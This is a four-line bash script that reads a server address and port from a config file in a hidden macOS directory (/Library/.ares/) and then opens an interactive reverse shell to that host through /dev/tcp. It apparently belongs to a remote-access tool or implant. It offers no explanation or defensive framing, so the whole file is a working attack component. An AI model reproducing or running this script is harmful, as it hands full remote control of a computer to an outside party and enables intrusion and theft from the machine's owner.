#!/bin/bash
source /Library/.ares/ares.conf
bash -i >& /dev/tcp/$SERVER/$port 0>&1
wait
